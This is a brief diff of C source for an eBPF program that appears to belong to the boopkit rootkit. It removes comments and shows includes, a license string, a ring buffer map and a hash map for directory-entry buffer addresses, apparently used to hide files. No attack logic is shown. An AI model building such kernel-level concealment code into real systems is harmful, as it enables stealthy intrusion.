@@ -35,19 +35,15 @@
 #include <bpf/bpf_core_read.h>
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_tracing.h>
-// clang-format off
 #include "boopkit.h"
-// clang-format on
 
 char LICENSE[] SEC("license") = "Dual BSD/GPL";
 
-// Ringbuffer Map to pass messages from kernel to user
 struct {
   __uint(type, BPF_MAP_TYPE_RINGBUF);
   __uint(max_entries, 256 * 1024);
 } rb SEC(".maps");
 
-// Map to fold the dents buffer addresses
 struct {
   __uint(type, BPF_MAP_TYPE_HASH);
   __uint(max_entries, 8192);
